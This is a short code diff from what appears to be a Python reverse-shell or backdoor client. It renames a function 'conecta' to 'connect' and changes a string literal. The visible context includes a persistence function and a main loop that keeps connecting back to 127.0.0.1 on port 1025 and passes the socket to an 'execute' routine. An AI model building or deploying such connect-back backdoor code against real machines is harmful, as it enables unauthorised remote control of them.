@@ -161,11 +161,11 @@ def persistence(sys):
     elif(sys == 'posix'):
         pass
 
-def conecta(ip, port):
+def connect(ip, port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
-        s.send('[+] Conectado :)')
+        s.send(r'[+] Conectado :)')
         return s
     except socket.error as erro:
         return None
@@ -206,7 +206,7 @@ def main():
     ip = '127.0.0.1'
     port = 1025
     while (True):
-        connection = conecta(ip, port)
+        connection = connect(ip, port)
         if(connection):
             execute(connection)
         else:
